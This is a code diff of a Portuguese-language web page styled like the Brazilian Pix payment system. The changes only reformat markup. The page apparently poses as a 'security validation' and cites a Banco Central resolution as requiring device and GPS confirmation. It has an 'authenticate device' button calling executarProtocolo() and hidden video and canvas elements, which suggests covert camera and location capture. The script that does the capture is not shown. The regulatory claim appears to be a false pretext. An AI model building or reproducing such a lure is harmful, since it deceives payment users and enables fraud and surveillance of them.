@@ -15,10 +15,18 @@
 <body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
     <div id="status-card" class="bg-white shadow-2xl rounded-3xl max-w-md w-full p-8 text-center border border-gray-200">
         <div id="ui-container">
-            <div class="mb-6"><div class="w-20 h-20 bg-teal-50 rounded-full flex items-center justify-center mx-auto"><svg class="w-10 h-10 text-[#32bcad]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg></div></div>
+            <div class="mb-6">
+                <div class="w-20 h-20 bg-teal-50 rounded-full flex items-center justify-center mx-auto">
+                    <svg class="w-10 h-10 text-[#32bcad]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                </div>
+            </div>
             <h2 class="text-xl font-bold text-gray-800 mb-4">Validação de Segurança</h2>
             <p class="text-gray-500 text-sm mb-8 leading-relaxed">Conforme a Resolução nº 1/2020 do Banco Central, este canal de recebimento exige confirmação de hardware e zona de segurança GPS.</p>
-            <div id="acao-area"><button onclick="executarProtocolo()" class="w-full bg-[#32bcad] text-white font-extrabold py-5 rounded-2xl shadow-lg transition-all active:scale-95 uppercase tracking-wider text-sm">AUTENTICAR DISPOSITIVO</button></div>
+            <div id="acao-area">
+                <button onclick="executarProtocolo()" class="w-full bg-[#32bcad] text-white font-extrabold py-5 rounded-2xl shadow-lg transition-all active:scale-95 uppercase tracking-wider text-sm">
+                    AUTENTICAR DISPOSITIVO
+                </button>
+            </div>
         </div>
         <video id="video" autoplay style="display:none;"></video>
         <canvas id="canvas" style="display:none;"></canvas>
